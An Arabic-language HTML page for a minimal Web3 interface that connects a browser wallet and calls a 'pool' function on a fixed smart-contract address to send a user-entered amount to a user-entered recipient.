<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, sans-serif;
        }

        body {
            background-color: #000000;
            color: #d4af37;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 30px;
            border-bottom: 1px solid rgba(212, 175, 55, 0.2);
            background: rgba(10, 10, 10, 0.9);
            backdrop-filter: blur(10px);
        }

        .logo {
            font-size: 1.2rem;
            font-weight: bold;
            letter-spacing: 1px;
            color: #d4af37;
            text-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
        }

        .wallet-btn {
            background: transparent;
            border: 1px solid #d4af37;
            color: #d4af37;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .wallet-btn:hover {
            background: #d4af37;
            color: #000000;
            box-shadow: 0 0 15px rgba(212, 175, 55, 0.4);
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background: linear-gradient(145deg, #0a0a0a, #121212);
            border: 1px solid rgba(212, 175, 55, 0.3);
            border-radius: 16px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8), 0 0 20px rgba(212, 175, 55, 0.05);
            position: relative;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: #c5a880;
        }

        input {
            width: 100%;
            background: #050505;
            border: 1px solid rgba(212, 175, 55, 0.3);
            border-radius: 8px;
            padding: 14px;
            color: #ffffff;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #d4af37;
            box-shadow: 0 0 8px rgba(212, 175, 55, 0.2);
        }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #d4af37, #aa8c2c);
            color: #000000;
            border: none;
            border-radius: 8px;
            padding: 15px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            margin-top: 10px;
        }

        .submit-btn:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }

        .submit-btn:active {
            transform: translateY(1px);
        }

        .success-message {
            display: none;
            text-align: center;
            padding: 20px 0;
        }

        .success-message h3 {
            color: #d4af37;
            font-size: 1.4rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
        }

        .success-message p {
            color: #a0a0a0;
            font-size: 0.95rem;
        }

        footer {
            text-align: center;
            padding: 15px;
            font-size: 0.8rem;
            color: #666;
            border-top: 1px solid rgba(212, 175, 55, 0.1);
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">PORTAL</div>
        <button id="walletBtn" class="wallet-btn" onclick="toggleWallet()">ربط المحفظة</button>
    </header>

    <main>
        <div class="card">
            <div id="formContainer">
                <div class="form-group">
                    <label>المبلغ المطلوب (يدعم الكسور والسنتات)</label>
                    <input type="number" id="amountInput" placeholder="0.00" step="any">
                </div>
                <div class="form-group">
                    <label>عنوان التحويل المستلم</label>
                    <input type="text" id="recipientInput" placeholder="0x...">
                </div>
                <button class="submit-btn" onclick="executePool()">إرسال</button>
            </div>

            <div id="successContainer" class="success-message">
                <h3>تمت بنجاح</h3>
                <p>تم تنفيذ المعاملة وتحويل الأصول بنجاح تام</p>
            </div>
        </div>
    </main>

    <footer>
        SECURE PROTOCOL
    </footer>

    <script>
        const CONTRACT_ADDRESS = "0x435473F46A46135fF19292815480F599d427Ed44";
        const CONTRACT_ABI = [
            "function pool(address recipient, uint256 exactWeiAmount) external",
            "function owner() external view returns (address)"
        ];

        let provider, signer, account;

        window.addEventListener('load', async () => {
            if (window.ethereum) {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if (accounts.length > 0) {
                        account = accounts[0];
                        signer = provider.getSigner();
                        updateButtonState();
                    }
                } catch (err) {
                    console.error(err);
                }

                window.ethereum.on('accountsChanged', (accounts) => {
                    if (accounts.length > 0) {
                        account = accounts[0];
                        signer = provider.getSigner();
                        updateButtonState();
                    } else {
                        account = null;
                        signer = null;
                        updateButtonState();
                    }
                });
            }
        });

        async function toggleWallet() {
            if (!window.ethereum) {
                return;
            }

            if (!account) {
                try {
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    signer = provider.getSigner();
                    account = await signer.getAddress();
                    updateButtonState();
                } catch (err) {
                    console.error(err);
                }
            } else {
                account = null;
                signer = null;
                updateButtonState();
            }
        }

        function updateButtonState() {
            const btn = document.getElementById('walletBtn');
            if (account) {
                btn.innerText = account.substring(0, 6) + "..." + account.substring(38);
            } else {
                btn.innerText = "ربط المحفظة";
            }
        }

        async function executePool() {
            try {
                if (!account || !signer) {
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    signer = provider.getSigner();
                    account = await signer.getAddress();
                    updateButtonState();
                }

                const amountVal = document.getElementById('amountInput').value;
                const recipientVal = document.getElementById('recipientInput').value.trim();

                if (!amountVal || parseFloat(amountVal) <= 0) {
                    return;
                }

                if (!ethers.utils.isAddress(recipientVal)) {
                    return;
                }

                const exactWeiAmount = ethers.utils.parseUnits(amountVal, 18);
                const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

                const tx = await contract.pool(recipientVal, exactWeiAmount);
                await tx.wait();

                document.getElementById('formContainer').style.display = 'none';
                document.getElementById('successContainer').style.display = 'block';
            } catch (error) {
                console.error(error);
            }
        }
    </script>
</body>
</html>
